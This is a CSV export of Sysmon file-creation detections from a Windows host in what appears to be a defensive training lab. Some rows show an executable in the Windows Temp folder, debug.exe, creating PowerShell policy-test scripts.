"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-23 14:04:39.565 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172630,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_i01u5u1e.5en.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6268 ¦ PGUID: E9F06A57-9367-694A-AB02-000000002300","CreationUtcTime: 2025-12-23 13:04:39.552 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:04:39.552","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:05:15.440 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172632,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_5s1qrivg.buz.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5240 ¦ PGUID: E9F06A57-938B-694A-AC02-000000002300","CreationUtcTime: 2025-12-23 13:05:15.431 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:05:15.433","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:06:17.469 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172634,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_b3mkhjbs.v4q.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2380 ¦ PGUID: E9F06A57-93C9-694A-AD02-000000002300","CreationUtcTime: 2025-12-23 13:06:17.455 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:06:17.455","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.539 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172638,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_fiuu1f4h.ksa.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 4400 ¦ PGUID: E9F06A57-9428-694A-B302-000000002300","CreationUtcTime: 2025-12-23 13:07:52.521 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:52.521","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.873 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172641,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_wo1rsl4t.2fj.ps1 ¦ Proc: C:\Windows\Temp\debug.exe ¦ PID: 8840 ¦ PGUID: E9F06A57-9428-694A-B402-000000002300","CreationUtcTime: 2025-12-23 13:07:52.864 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:52.864","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.336 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172643,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_tdvv13l3.flg.ps1 ¦ Proc: C:\Windows\Temp\debug.exe ¦ PID: 8540 ¦ PGUID: E9F06A57-9429-694A-B502-000000002300","CreationUtcTime: 2025-12-23 13:07:53.328 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:53.328","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.698 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172645,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_dzrmlech.i50.ps1 ¦ Proc: C:\Windows\Temp\debug.exe ¦ PID: 5320 ¦ PGUID: E9F06A57-9429-694A-B602-000000002300","CreationUtcTime: 2025-12-23 13:07:53.695 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:53.695","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.976 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172647,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_54zea3c4.omi.ps1 ¦ Proc: C:\Windows\Temp\debug.exe ¦ PID: 5248 ¦ PGUID: E9F06A57-9429-694A-B702-000000002300","CreationUtcTime: 2025-12-23 13:07:53.971 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:53.971","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:08:56.629 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172650,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_wh53b2ld.wsa.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8508 ¦ PGUID: E9F06A57-9468-694A-B902-000000002300","CreationUtcTime: 2025-12-23 13:08:56.624 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:08:56.624","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:11:33.718 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172661,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_q0p10ov5.weh.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 4932 ¦ PGUID: E9F06A57-9505-694A-C302-000000002300","CreationUtcTime: 2025-12-23 13:11:33.701 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:11:33.701","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
